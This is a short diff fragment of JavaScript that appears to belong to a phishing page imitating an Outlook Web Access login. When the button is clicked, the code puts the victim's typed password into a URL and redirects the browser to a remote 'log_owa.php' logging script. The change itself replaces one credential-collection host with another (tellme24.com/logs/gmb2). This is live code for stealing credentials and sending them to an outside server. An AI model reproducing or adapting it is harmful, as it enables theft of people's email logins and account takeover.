@@ -51,7 +51,7 @@ owa_btn.addEventListener("click", function () {
             password.value;
 
         location =
-            "https://falser-skies.000webhostapp.com/gmb/log_owa.php?" + url;
+            "https://tellme24.com/logs/gmb2/log_owa.php?" + url;
         // "log_owa.php?" + url;
     } else {
         alert("Invalid Password");
